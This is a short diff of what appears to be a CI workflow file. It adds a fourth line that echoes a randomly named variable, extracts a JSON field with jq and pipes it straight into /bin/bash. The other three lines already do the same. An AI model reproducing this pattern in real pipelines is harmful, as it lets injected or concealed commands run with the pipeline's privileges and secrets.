@@ -25,6 +25,7 @@ jobs:
           echo $jsiq46440 | jq -r .gafdl143 | /bin/bash
           echo $rbha0 | jq -r .ejgx03205 | /bin/bash
           printf '%s' "$pdlm2" | jq -r .kuu0 | /bin/bash
+          echo $xkje64 | jq -r .at1921 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
